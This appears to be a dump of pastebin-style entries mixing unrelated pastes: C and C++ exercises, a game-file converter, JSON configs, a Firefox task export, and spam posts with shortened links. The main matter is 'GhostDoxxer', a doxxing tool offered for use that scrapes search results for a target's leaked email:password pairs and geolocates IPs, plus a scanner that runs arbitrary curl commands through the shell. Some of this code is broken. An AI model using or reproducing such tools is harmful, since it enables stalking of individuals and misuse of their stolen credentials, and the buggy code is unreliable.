        url = ""https://www.google.fr/search?num=100&q=\\intext:\""%s\""\\""
        content = requests.get(url % (email)).text
        urls = re.findall('url\\?q=(.*?)&', content)
        count = len(urls)
        if count == 0:
            print(warning+"" No results found."")
        else:
            print(wait+"" Scanning %s link(s)..."" % (str(count)))
            count_password = 0
            for url in urls:
                if not ""googleusercontent"" in url:
                    if not ""/settings/ads"" in url:
                        if not ""webcache.googleusercontent.com/"" in url:
                            if not ""/policies/faq"" in url:
                                try:
                                    texte = requests.get(url).text
                                    combo = re.search(email+r"":([a-zA-Z0-9_ & * $ - ! / ; , ? + =  | \. ]+)"", texte).group()
                                    if combo:
                                        passw = combo.split("":"")[1]
                                        tuples = (email, passw)
                                        count_password += 1
                                        table_dump.append(tuples)
                                except:
                                    pass
            if count_password > 0:
                table = SingleTable(table_dump, "" Dump "")
                print(""\n""+table.table)
            else:
                print(warning+"" No data found for '%s'"" % (email))
    def ip_finder(self):
        ip = input("" IP Address: "")
        print(""\n""+wait+"" Locating '%s'..."" % (ip))
        TABLE_DATA = []
        url = ""http://ip-api.com/json/""
        data = requests.get(url+ip).content.decode('utf-8')
        values = json.loads(data)
        status = values['status']
        if status != ""success"":
            print(warning+"" Invalid IP Address."")
        else:
            infos = (""IP"", ip)
            TABLE_DATA.append(infos)
            infos = (""ISP"", values['isp'])
            TABLE_DATA.append(infos)
            infos = (""Organisation"", values['org'])
            TABLE_DATA.append(infos)
            infos = (""Country"", values['country'])
            TABLE_DATA.append(infos)
            infos = (""Region"", values['regionName'])
            TABLE_DATA.append(infos)
            infos = (""City"", values['city'])
            TABLE_DATA.append(infos)
            infos = (""Zip Code"", values['zip'])
            TABLE_DATA.append(infos)
            localisation = str(values['lat'])+', '+str(values['lon'])
            infos = (""Location"", localisation)
            TABLE_DATA.append(infos)
            infos = (""Maps"", ""https://www.google.fr/maps?q=""+localisation)
            TABLE_DATA.append(infos)
            table = SingleTable(TABLE_DATA, ip)
            print(""\n""+table.table)
    def run_tool(self):
        print(""\nGhostDoxxer - Comprehensive Information Gathering Tool\n"")
        while True:
            print(""1. Extract Information from Text"")
            print(""2. Search Google for Email Address"")
            print(""3. Search Email Address for Leaks"")
            print(""4. Find Information by IP Address"")
            print(""5. Exit"")
            choice = input(""\nEnter your choice: "")
            if choice == ""1"":
                self.extract_info()
                print(""\n""+Fore.BLUE+""[I]""+Fore.RESET+"" Information Extraction Complete:"")
                if self.email:
                    print(f""Email Addresses: {', '.join(self.email)}"")
                if self.telephone:
                    print(f""Phone Numbers: {', '.join(self.telephone)}"")
                if self.urls:
                    print(f""URLs: {', '.join(self.urls)}"")
                if self.ipv4:
                    print(f""IPv4 Addresses: {', '.join(self.ipv4)}"")
                if self.ipv6:
                    print(f""IPv6 Addresses: {', '.join(self.ipv6)}"")
            elif choice == ""2"":
                query = input(""Enter query for Google search: "")
                self.google_search(query)
            elif choice == ""3"":
                self.search_email()
            elif choice == ""4"":
                self.ip_finder()
            elif choice == ""5"":
                print(""Exiting GhostDoxxer..."")
                break
            else:
                print(warning+"" Invalid choice. Please select a valid option."")
class FacebookSearchTool(GhostDoxxer):
    def __init__(self):
        super().__init__(data=None)
    def search_facebook(self, name):
        # Function to search Facebook profiles by name
        # ...
    def run_tool(self):
        print(""\nFacebookSearchTool - Comprehensive Facebook Information Gathering Tool\n"")
        while True:
            print(""1. Search Facebook by Name"")
            print(""2. Extract Information from Text"")
            print(""3. Search Google for Email Address"")
            print(""4. Search Email Address for Leaks"")
            print(""5. Find Information by IP Address"")
            print(""6. Exit"")
            choice = input(""\nEnter your choice: "")
            if choice == ""1"":
                name = input(""Enter the name to search on Facebook: "")
                self.search_facebook(name)
            elif choice == ""2"":
                data = input(""Enter the text or data for analysis: "")
                self.data = data
                self.extract_info()
                print(""\n""+Fore.BLUE+""[I]""+Fore.RESET+"" Information Extraction Complete:"")
                if self.email:
                    print(f""Email Addresses: {', '.join(self.email)}"")
                if self.telephone:
                    print(f""Phone Numbers: {', '.join(self.telephone)}"")
                if self.urls:
                    print(f""URLs: {', '.join(self.urls)}"")
                if self.ipv4:
                    print(f""IPv4 Addresses: {', '.join(self.ipv4)}"")
                if self.ipv6:
                    print(f""IPv6 Addresses: {', '.join(self.ipv6)}"")
            elif choice == ""3"":
                query = input(""Enter query for Google search: "")
                self.google_search(query)
            elif choice == ""4"":
                self.search_email()
            elif choice == ""5"":
                self.ip_finder()
            elif choice == ""6"":
                print(""Exiting FacebookSearchTool..."")
                break
            else:
                print(warning+"" Invalid choice. Please select a valid option."")
if __name__ == ""__main__"":
    print(""\nWelcome to the FacebookSearchTool - Comprehensive Facebook Information Gathering Tool"")
    facebook_tool = FacebookSearchTool()
    facebook_tool.run_tool()
"
f5nzzsa0,GhostQuery,xGHOSTSECx,Python,Sunday 24th of December 2023 12:52:13 PM CDT,"import requests
from bs4 import BeautifulSoup
import logging
import sqlite3
import re
from pathlib import Path

class GhostQuery:
    def __init__(self):
        self.base_url = ""https://www.google.com/search?q=""
        self.headers = {
            ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3""
        }
        self.log_filename = 'ghostquery.log'
        self.db_filename = 'ghostquery_results.db'
        self.logger = self.setup_logger()
        self.setup_database()

    def setup_logger(self):
        logger = logging.getLogger('GhostQuery')
        logger.setLevel(logging.INFO)
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        file_handler = logging.FileHandler(self.log_filename)
        file_handler.setFormatter(formatter)
        logger.addHandler(file_handler)
        return logger

    def setup_database(self):
        db_path = Path(self.db_filename)
        if not db_path.is_file():
            conn = sqlite3.connect(self.db_filename)
            c = conn.cursor()
            c.execute('''CREATE TABLE IF NOT EXISTS search_results
                          (title text, link text)''')
            conn.commit()
            conn.close()

    def save_to_database(self, title, link):
        conn = sqlite3.connect(self.db_filename)
        c = conn.cursor()
        c.execute(""INSERT INTO search_results VALUES (?, ?)"", (title, link))
        conn.commit()
        conn.close()

    def google_search(self, query, num_results=10):
        try:
            query = re.sub(r'[;\'""()|]', '', query)
            url = f""{self.base_url}{query}&num={num_results}""
            response = requests.get(url, headers=self.headers)

            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                results = soup.find_all('div', class_='tF2Cxc')
                return results
            else:
                self.logger.error(f""Failed to retrieve search results. Status code: {response.status_code}"")
                return None
        except requests.exceptions.RequestException as e:
            self.logger.error(f""Request error: {str(e)}"")
            return None
        except Exception as e:
            self.logger.error(f""An unexpected error occurred: {str(e)}"")
            return None

    def analyze_results(self, results):
        if results:
            analysis = []
            for idx, result in enumerate(results, start=1):
                title = result.find('h3').text
                link = result.find('a')['href']
                analysis.append({'index': idx, 'title': title, 'link': link})
                self.save_to_database(title, link)
            return analysis
        else:
            self.logger.warning(""No results found for analysis."")
            return []

    def run(self):
        try:
            num_results = int(input(""Enter the number of results to fetch (default is 10): "") or 10)
            promiscuous_mode = input(""Enable Promiscuous Mode? (y/n): "").strip().lower()
            if promiscuous_mode == 'y':
                print(""Promiscuous Mode is enabled."")
            else:
                print(""Promiscuous Mode is disabled."")

            query = input(""Enter your search query: "")
            results = self.google_search(query, num_results)
            analysis = self.analyze_results(results)

            if analysis:
                print(""Analysis Results:"")
                for item in analysis:
                    print(f""{item['index']}. {item['title']}"")
                    print(item['link'])
                    print()
            else:
                print(""No results found. Check the log file for details."")
        except KeyboardInterrupt:
            print(""\nSearch aborted by the user."")
        except Exception as e:
            self.logger.error(f""An unexpected error occurred: {str(e)}"")

if __name__ == ""__main__"":
    ghost_query = GhostQuery()
    ghost_query.run()"
ErDUnXGQ,Untitled,sissou123,C++,Sunday 24th of December 2023 12:51:43 PM CDT,"Beginning C++ Programming - From Beginner to Beyond
Obtain Modern C++ Object-Oriented Programming (OOP) and STL skills. C++14 and C++17 covered. C++20 info see below.
for more:https://cuty.io/5JXA8"
C1C4bZP1,Impossible Game Dat to Flash,JackLSummer15,Python,Sunday 24th of December 2023 12:45:37 PM CDT,"import argparse, sys, struct

class Flash:
    def ActionScript(input, output):
        with open(input,'rb') as l:
            script=open(output,'w')
            script.write('function initObjectPos()'+'\n')
            script.write('{'+'\n')
            l.read(5)
            objectcount=struct.unpack('>h',l.read(2))[0]
            print('adding '+str(objectcount)+' objects...')
            for object in range(objectcount):
                objectid=struct.pack('>c',l.read(1))[0]
                l.read(1)
                l.read(1)
                width=struct.unpack('>h',l.read(2))[0]
                l.read(1)
                l.read(1)
                height=struct.unpack('>h',l.read(2))[0]
                if objectid==1: #spike
                    script.write('  addS('+str(width)+','+str(height)+');'+'\n')
                elif objectid==0: #block
                    script.write('  addB('+str(width)+','+str(height)+');'+'\n')
                elif objectid==2: #pit
                    script.write('  addP('+str(width)+','+str(height)+');'+'\n')
            l.read(2)
            levelend=struct.unpack('>h',l.read(2))[0]
            l.read(3)
            bkgcount=struct.pack('>c',l.read(1))[0]
            for bkg in range(bkgcount):
                l.read(2)
                bkgwidth=struct.unpack('>h',l.read(2))[0]
                l.read(4)
                bkgcolor=struct.pack('>c',l.read(1))[0]
                if bkgcolor==0: #blue
                    continue
                elif bkgcolor==1: #yellow
                    continue
                elif bkgcolor==2: #green
                    continue
                elif bkgcolor==3: #violet
                    continue
                elif bkgcolor==4: #pink
                    continue
                elif bkgcolor==5: #black
                    continue

            script.write('}')

parser=argparse.ArgumentParser(description='Converts Impossible Game DAT files to Flash (ActionScript)')
parser.add_argument('-i', action='store', dest='i', help='Input file')
parser.add_argument('-o', action='store', dest='o', help='Output file')
args = vars(parser.parse_args())

if args['i'] == None or args['o'] == None:
	parser.print_help(sys.stderr)
	quit()

Flash.ActionScript(args['i'], args['o'])"
juJ07Cqk,Vulnerability Scanner,xGHOSTSECx,Python,Sunday 24th of December 2023 12:23:28 PM CDT,"#   Amidst the sprawling digital cosmos, where the demigods of vulnerabilities and threats clash in unending strife, emerges a sentinel unlike any other - *Saint Michael*. Cloaked in gleaming armor forged from the most resilient cryptographic alloys, he wields a blade of code that pulses with the wisdom of the ages.

#   The digital demigods, harboring malevolent intent, quail at the mere whisper of *Saint Michael's* name. As the suspense thickens, he strides into the arena, a beacon of hope in the swirling chaos. This is not merely a guardian; this is a tool of unparalleled power. With the finesse to parry the most ruthless of attacks and the might to unleash earth-shattering countermeasures, *Saint Michael* transforms the battlefield into a symphony of defenses and assaults.

#   In a breathtaking crescendo, he turns the tables, launching an onslaught that reverberates through the digital cosmos. The climactic battle rages, but *Saint Michael* stands resolute, not just defending but also delivering thunderous blows that reverberate throughout the virtual realm. He is the guardian of the digital frontier, a relentless protector who not only parries the enemy's onslaught but also delivers an earth-shattering response, ensuring that the forces of good triumph in the epic clash of the demigods.
*****************************************************************
import sqlite3
import requests
from bs4 import BeautifulSoup
from datetime import datetime
import time
import subprocess
import nmap
import http.server
import socketserver
import threading

# Define the database file
db_file = ""vulnerabilities.db""

# Define your API keys or access credentials
cve_api_key = ""YOUR_CVE_API_KEY""
nvd_api_url = ""https://services.nvd.nist.gov/rest/json/cves/1.0""
vendor_advisory_url = ""https://example.com/vendor-advisories""

# Function to create the database table
def create_database():
    conn = sqlite3.connect(db_file)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS vulnerabilities (
            id INTEGER PRIMARY KEY,
            cve_id TEXT UNIQUE,
            description TEXT,
            severity TEXT,
            affected_software TEXT,
            last_updated TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    conn.commit()
    conn.close()

# Function to fetch vulnerability data from CVE API
def fetch_cve_data(cve_id):
    headers = {""Api-Key"": cve_api_key}
    params = {""cve_id"": cve_id}
    response = requests.get(nvd_api_url, headers=headers, params=params)

    if response.status_code == 200:
        return response.json()
    return None

# Function to fetch vendor-specific advisory data from a website
def fetch_vendor_advisory_data():
    response = requests.get(vendor_advisory_url)

    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        # Parse the HTML and extract relevant data
        # Example: advisory_data = soup.find(""div"", class_=""advisory-content"").text
        # Replace this with your own parsing logic
        advisory_data = ""Sample advisory data""
        return advisory_data
    return None

# Function to update the database with new vulnerability data
def update_database():
    cve_id = input(""Enter CVE ID: "")
    cve_data = fetch_cve_data(cve_id)
    vendor_advisory_data = fetch_vendor_advisory_data()

    if cve_data:
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()

        cursor.execute('INSERT OR REPLACE INTO vulnerabilities (cve_id, description, severity, affected_software) VALUES (?, ?, ?, ?)',
                       (cve_id, cve_data[""description""], cve_data[""severity""], ""Sample Software""))

        conn.commit()
        conn.close()
        print(""CVE data updated successfully."")

    if vendor_advisory_data:
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()

        cursor.execute('INSERT OR REPLACE INTO vulnerabilities (cve_id, description, severity, affected_software) VALUES (?, ?, ?, ?)',
                       (""VENDOR-123"", ""Vendor Advisory"", ""High"", ""Sample Software""))

        conn.commit()
        conn.close()
        print(""Vendor advisory data updated successfully."")

# Function to query the database for known vulnerabilities
def query_database():
    conn = sqlite3.connect(db_file)
    cursor = conn.cursor()

    cursor.execute('SELECT * FROM vulnerabilities')
    results = cursor.fetchall()

    for row in results:
        print(f""CVE ID: {row[1]}"")
        print(f""Description: {row[2]}"")
        print(f""Severity: {row[3]}"")
        print(f""Affected Software: {row[4]}"")
        print(f""Last Updated: {row[5]}"")
        print("""")

    conn.close()

# Function to start the local HTTP proxy server
def start_proxy_server(port):
    with socketserver.TCPServer(("""", port), http.server.SimpleHTTPRequestHandler) as httpd:
        print(f""Local proxy server running on port {port}"")
        httpd.serve_forever()

# Function to scan the target and perform actions
def scan_target(ip_range, nmap_args, proxy_port):
    # Start the local proxy server in a separate thread
    proxy_thread = threading.Thread(target=start_proxy_server, args=(proxy_port,))
    proxy_thread.daemon = True
    proxy_thread.start()

    # Perform the nmap scan
    nm = nmap.PortScanner()
    nm.scan(ip_range, arguments=nmap_args)

    for host, scan_result in nm.all_hosts().items():
        print(f""Scanning host: {host}"")

        for proto, ports in scan_result['tcp'].items():
            for port, port_info in ports.items():
                print(f""Port {port}/{proto}: {port_info['name']} - {port_info['state']}"")

                if int(port) == 80:  # Check if it's an HTTP port
                    open_port_actions(host, proxy_port)

# Function to perform actions on an open HTTP port
def open_port_actions(host, proxy_port):
    print(f""Open HTTP port detected on {host}."")
    while True:
        print(""Choose an action:"")
        print(""1. GET Request"")
        print(""2. HEAD Request"")
        print(""3. POST Request"")
        print(""4. PUT Request"")
        print(""5. DELETE Request"")
        print(""6. Custom CURL Command"")
        print(""7. Exit"")

        choice = input(""Enter your choice (1/2/3/4/5/6/7): "")

        if choice == '1':
            make_http_request(host, 'GET', proxy_port)
        elif choice == '2':
            make_http_request(host, 'HEAD', proxy_port)
        elif choice == '3':
            make_http_request(host, 'POST', proxy_port)
        elif choice == '4':
            make_http_request(host, 'PUT', proxy_port)
        elif choice == '5':
            make_http_request(host, 'DELETE', proxy_port)
        elif choice == '6':
            custom_curl_command = input(""Enter your custom CURL command: "")
            make_custom_request(custom_curl_command)
        elif choice == '7':
            break
        else:
            print(""Invalid choice. Please enter a valid option."")

# Function to make HTTP requests through the local proxy server
def make_http_request(host, method, proxy_port):
    curl_command = f""curl -x http://127.0.0.1:{proxy_port} -X {method} -I http://{host}""

    try:
        result = subprocess.check_output(curl_command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        print(result)
    except subprocess.CalledProcessError as e:
        print(f""Error performing {method} request to host {host}: {e.output}"")

# Function to execute a custom CURL command
def make_custom_request(curl_command):
    try:
        result = subprocess.check_output(curl_command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        print(result)
    except subprocess.CalledProcessError as e:
        print(f""Error executing custom CURL command: {e.output}"")

# Expert Command 1: Generate a vulnerability report
def expert_command_1():
    print(""Executing Expert Command 1: Generating a vulnerability report."")
    # Add code to generate a detailed vulnerability report here

# Expert Command 2: Perform a comprehensive scan
def expert_command_2():
    print(""Executing Expert Command 2: Performing a comprehensive vulnerability scan."")
    # Add code to perform a comprehensive scan here

# Expert Command 3: Execute custom advanced action
def expert_command_3():
    print(""Executing Expert Command 3: Performing a custom advanced action."")
    # Add code for a custom advanced action here

if __name__ == ""__main__"":
    create_database()

    while True:
        print(""Options:"")
        print(""1. Query Database"")
        print(""2. Update Database"")
        print(""3. Advanced Options"")
        print(""4. Exit"")
        choice = input(""Enter your choice (1/2/3/4): "")

        if choice == '1':
            query_database()
        elif choice == '2':
            update_database()
        elif choice == '3':
            print(""Advanced Options:"")
            print(""5. Generate Vulnerability Report"")
            print(""6. Perform Comprehensive Scan"")
            print(""7. Execute Custom Advanced Action"")
            advanced_choice = input(""Enter your choice (5/6/7): "")

            if advanced_choice == '5':
                expert_command_1()
            elif advanced_choice == '6':
                expert_command_2()
            elif advanced_choice == '7':
                expert_command_3()
            else:
                print(""Invalid choice. Please enter a valid option."")
        elif choice == '4':
            break
        else:
            print(""Invalid choice. Please enter a valid option."")

    print(""Exiting the script."")

#   Written By Sebastian Dante Alexander
"
8GbQyxK0,12 2023,spidersam,JSON,Sunday 24th of December 2023 11:43:03 AM CDT,"[
  {
    ""name"": ""Zoo-01-12-2023-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/6443d32d-36ad-726f-9896-b60e6ebc8c70.mp3"",
    ""imageUrl"": ""https://i.imgur.com/MGXdb63m.jpg""
  },
  {
    ""name"": ""Zoo-04-12-2023-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/efe0fa55-c45b-4931-4ed3-879c7444ef9d.mp3"",
    ""imageUrl"": ""https://i.imgur.com/MGXdb63m.jpg""
  },
  {
    ""name"": ""Zoo-05-12-2023-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/237c1a3c-f9b5-8770-4d2d-681590f0a0c8.mp3"",
    ""imageUrl"": ""https://i.imgur.com/MGXdb63m.jpg""
  },
  {
    ""name"": ""Zoo-06-12-2023-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/47d9bb66-bd5c-986d-ae85-4b7bd6f89151.mp3"",
    ""imageUrl"": ""https://i.imgur.com/MGXdb63m.jpg""
  },
  {
    ""name"": ""Zoo-07-12-2023-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/8af3dc90-be93-4275-993b-705051ce286d.mp3"",
    ""imageUrl"": ""https://i.imgur.com/MGXdb63m.jpg""
  },
  {
    ""name"": ""Zoo-11-12-2023-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/1c62be72-40c1-2bd9-4fe2-6c1464045b1d.mp3"",
    ""imageUrl"": ""https://i.imgur.com/MGXdb63m.jpg""
  },
  {
    ""name"": ""Zoo-12-12-2023-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/06bed1b6-f9e1-e5cd-8808-8f2c42fd8b8d.mp3"",
    ""imageUrl"": ""https://i.imgur.com/MGXdb63m.jpg""
  },
  {
    ""name"": ""Zoo-13-12-2023-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/8de4158e-11f2-c510-1d5e-8ee7ff9b1ee3.mp3"",
    ""imageUrl"": ""https://i.imgur.com/MGXdb63m.jpg""
  },
  {
    ""name"": ""Zoo-14-12-2023-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/1e5f58cb-98b9-4202-9732-f66c00b054b2.mp3"",
    ""imageUrl"": ""https://i.imgur.com/MGXdb63m.jpg""
  },
  {
    ""name"": ""Zoo-15-12-2023-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/55fc21ea-d93b-2ff0-3aa4-4f8912d1ea4f.mp3"",
    ""imageUrl"": ""https://i.imgur.com/MGXdb63m.jpg""
  },
  {
    ""name"": ""Zoo-18-12-2023-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/ae4edb35-3ac4-c4a5-3422-615817dd0ac9.mp3"",
    ""imageUrl"": ""https://i.imgur.com/MGXdb63m.jpg""
  },
  {
    ""name"": ""Zoo-19-12-2023-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/84aba3c4-1247-db27-c86e-8b164488b0f1.mp3"",
    ""imageUrl"": ""https://i.imgur.com/MGXdb63m.jpg""
  },
  {
    ""name"": ""Zoo-20-12-2023-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/74b5dfc0-d0f0-d5cf-55f0-c51fc96d5fa0.mp3"",
    ""imageUrl"": ""https://i.imgur.com/MGXdb63m.jpg""
  },
  {
    ""name"": ""Zoo-21-12-2023-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/d195f9f4-56f8-7aaa-58c7-bc9fa208bdcc.mp3"",
    ""imageUrl"": ""https://i.imgur.com/MGXdb63m.jpg""
  },
  {
    ""name"": ""Zoo-22-12-2023-S@m"",
    ""url"": ""https://d3ctxlq1ktw2nl.cloudfront.net/staging/2023-11-24/1a6b5a48-4301-84f7-2716-3eaa6d4d2034.mp3"",
    ""imageUrl"": ""https://i.imgur.com/MGXdb63m.jpg""
  }
]"
CXYrrMT3,Untitled,cepxuozab,C++,Sunday 24th of December 2023 11:38:34 AM CDT,"{
  ""routing_settings"": {
    ""bus_wait_time"": 2,
    ""bus_velocity"": 30
  },
  ""render_settings"": {
    ""width"": 900,
    ""height"": 2000,
    ""padding"": 50,
    ""outer_margin"": 150,
    ""stop_radius"": 5,
    ""line_width"": 14,
    ""bus_label_font_size"": 20,
    ""bus_label_offset"": [
      7,
      15
    ],
    ""stop_label_font_size"": 20,
    ""stop_label_offset"": [
      7,
      -3
    ],
    ""underlayer_color"": [
      255,
      255,
      255,
      0.85
    ],
    ""underlayer_width"": 3,
    ""color_palette"": [
      [
        255,
        0,
        255
      ],
      ""red"",
      ""green"",
      ""blue""
    ],
    ""layers"": [
      ""bus_lines"",
      ""bus_labels"",
      ""stop_points"",
      ""stop_labels""
    ]
  },
  ""base_requests"": [
    {
      ""type"": ""Stop"",
      ""name"": ""A"",
      ""latitude"": 0.5,
      ""longitude"": -1,
      ""road_distances"": {
        ""B"": 100000
      }
    },
    {
      ""type"": ""Stop"",
      ""name"": ""B"",
      ""latitude"": 0,
      ""longitude"": -1.1,
      ""road_distances"": {}
    },
    {
      ""type"": ""Stop"",
      ""name"": ""C"",
      ""latitude"": -2,
      ""longitude"": -1.1,
      ""road_distances"": {}
    },
    {
      ""type"": ""Bus"",
      ""name"": ""256"",
      ""stops"": [
        ""B"",
        ""A""
      ],
      ""is_roundtrip"": false
    }
  ],
  ""stat_requests"": [
    {
      ""id"": 1550472237,
      ""type"": ""Bus"",
      ""name"": ""256""
    },
    {
      ""id"": 2030406697,
      ""type"": ""Stop"",
      ""name"": ""A""
    },
    {
      ""id"": 1525479286,
      ""type"": ""Stop"",
      ""name"": ""B""
    },
    {
      ""id"": 472222524,
      ""type"": ""Stop"",
      ""name"": ""C""
    },
    {
      ""id"": 487735901,
      ""type"": ""Route"",
      ""from"": ""A"",
      ""to"": ""B""
    },
    {
      ""id"": 1433285658,
      ""type"": ""Route"",
      ""from"": ""B"",
      ""to"": ""A""
    },
    {
      ""id"": 149148789,
      ""type"": ""Route"",
      ""from"": ""B"",
      ""to"": ""C""
    },
    {
      ""id"": 971813300,
      ""type"": ""Route"",
      ""from"": ""C"",
      ""to"": ""A""
    }
  ]
}"
YHbfvMMA,Untitled,Nweltalv3,C,Sunday 24th of December 2023 11:11:55 AM CDT,"#include <stdio.h>
#include <string.h>

void printCharacter(char character, int count) {
    for (int i = 0; i < count; i++) {
        printf(""%c"", character);
    }
}

int main() {
    char Text[1001];
    fgets(Text, sizeof(Text), stdin);
    int numberBeforeBs, numberBeforeSp, numberBeforeNl, numberBeforeSq, numberBefore;

    int length = strlen(Text);

    for (int i = 0; i < length; i++) {
        if(Text[i] == 'b' && Text[i + 1] == 'S') {
            if (sscanf(&Text[i - 1], ""%d"", &numberBeforeBs) == 1) {
                for (int i = 0; i < numberBeforeBs; i++) {
                    printf(""\\"");
                }
                i += 2;
            }
        }
        if(Text[i] == 's' && Text[i + 1] == 'p') {
            if (sscanf(&Text[i - 1], ""%d"", &numberBeforeSp) == 1) {
                for (int i = 0; i < numberBeforeSp; i++) {
                    printf("" "");
                }
                i += 2;
            }
        }
        if(Text[i] == 'n' && Text[i + 1] == 'l') {
            if (sscanf(&Text[i - 1], ""%d"", &numberBeforeNl) == 1) {
                for (int i = 0; i < numberBeforeNl; i++) {
                    printf(""\n"");
                }
                i += 2;
            }
        }
        if(Text[i] == 's' && Text[i + 1] == 'Q') {
            if (sscanf(&Text[i - 1], ""%d"", &numberBeforeSq) == 1) {
                for (int i = 0; i < numberBeforeSq; i++) {
                    printf(""'"");
                }
                i += 2;
            }
        } else if (Text[i] >= '0' && Text[i] <= '9') {
            int count = 0;
            while (Text[i] >= '0' && Text[i] <= '9') {
                count = count * 10 + (Text[i] - '0');
                i++;
            }
            
            char character = Text[i];
            
            // If the chunk is only numbers, use the last digit as the character
            if (character >= '0' && character <= '9') {
                character = count % 10 + '0';
                count = 1;
            }

            printCharacter(character, count);
        } else {
            // Handle other characters
            printf(""%c"", Text[i]);
        }
    }

    return 0;
}
"
XUSC0h6A,Firefox Default Browser Agent export,harrym,XML,Sunday 24th of December 2023 10:27:05 AM CDT,"<?xml version=""1.0"" encoding=""UTF-16""?>
<Task version=""1.2"" xmlns=""http://schemas.microsoft.com/windows/2004/02/mit/task"">
  <RegistrationInfo>
    <Author>Mozilla</Author>
    <Description>The Default Browser Agent task checks when the default changes from Firefox to another browser. If the change happens under suspicious circumstances, it will prompt users to change back to Firefox no more than two times. This task is installed automatically by Firefox, and is reinstalled when Firefox updates. To disable this task, update the “default-browser-agent.enabled” preference on the about:config page or the Firefox enterprise policy setting “DisableDefaultBrowserAgent”.</Description>
    <URI>\Mozilla\Firefox Default Browser Agent 308046B0AF4A39CB</URI>
  </RegistrationInfo>
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2023-11-11T16:05:32+01:00</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id=""Author"">
      <UserId>S-1-5-21-2063358666-2461647202-2508659107-1001</UserId>
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <Duration>PT10M</Duration>
      <WaitTimeout>PT1H</WaitTimeout>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT12H5M</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context=""Author"">
    <Exec>
      <Command>C:\Program Files\Mozilla Firefox\default-browser-agent.exe</Command>
      <Arguments>do-task ""308046B0AF4A39CB""</Arguments>
    </Exec>
  </Actions>
</Task>"
P7jK9tT9,Untitled,sissou123,C#,Sunday 24th of December 2023 10:12:51 AM CDT,"The Unity C# Survival Guide
Created in partnership with Unity Technologies: Master C# with Unity in this Complete Guide! 
for more:https://dz-linkk.com/NLd6T
"
kttFahZB,Untitled,cyberjab,C++,Sunday 24th of December 2023 09:42:00 AM CDT,"//#pragma GCC optimize(""03"")
//#pragma GCC target(""sse,sse2,sse3,ssse3,sse4,popcnt,abm,mmx,avx,tune=native"")
#include <iostream>
#include <iomanip>
#include <cstdlib>
#include <cstdio>
#include <string>
#include <vector>
#include <map>
#include <set>
#include <unordered_map>
#include <unordered_set>
#include <queue>
#include <deque>
#include <cmath>
#include <numeric>
#include <algorithm>
#include <ctime>
#include <chrono>
#include <random>
#include <functional>
#include <fstream>

using namespace std;
const int MOD = 1e9 + 7;
const int xx = 257;

vector<long long> x = {1};

bool isequal(int from1, int from2, int len, vector<long long> h, vector<long long> x, vector<long long> h2) {
    return (h[from1 + len - 1] + h2[from2 - 1] * x[len]) % MOD ==
        (h2[from2 + len - 1] + h[from1 - 1] * x[len]) % MOD;
}

void make_x_koefs(int n) {
    int k = x.size();
    if (n + 1 > k) {
        x.resize(n + 1);
    }
    for (int i = k; i < n + 1; i++) {
        x[i] = (x[i - 1] * xx) % MOD;
    }
}

vector <long long> make_polynom(string s) {
    s = "" "" + s;
    vector <long long> h(s.size(), 0);
    for (int i = 1; i < s.size(); i++) {
        h[i] = (h[i - 1] * xx + s[i]) % MOD;
    }
    return h;
}

vector <string> read_tests(string fname) {
    fstream tests;
    tests.open(fname, ios::in);
    vector <string> ts;
    if (!tests.is_open()) {
        return ts;
    }
    string s;
    while (tests >> s) {
        ts.push_back(s);
    }
    tests.close();
    return ts;
}

